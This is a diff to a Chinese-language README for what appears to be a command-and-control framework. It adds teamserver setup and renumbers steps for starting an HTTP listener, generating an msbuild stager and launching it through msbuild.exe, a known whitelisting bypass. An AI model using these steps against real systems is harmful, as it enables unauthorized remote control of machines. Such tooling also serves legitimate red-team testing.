@@ -39,8 +39,17 @@ python3 -m pip install -r requirements.txt
 python3 st.py
 ```
 
-~~
-### 2、开启监听
+### 2、开启teamserver
+
+```
+python3 teamserver.py <teamserver_ip> <teamserver_password>
+```
+
+### 3、连接teamserver
+
+python3 st.py wss://username:<teamserver_password>@<teamserver_ip>:5000
+
+### 4、开启监听
 
 ```
 listeners
@@ -48,10 +57,8 @@ use http
 options
 start
 ```
-~~
 
-
-### 3、生成payload
+### 5、生成payload
 
 ```
 stagers
@@ -60,7 +67,7 @@ use msbuild
 generate http
 ```
 
-### 4、启动方式之一
+### 6、启动方式之一
 
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
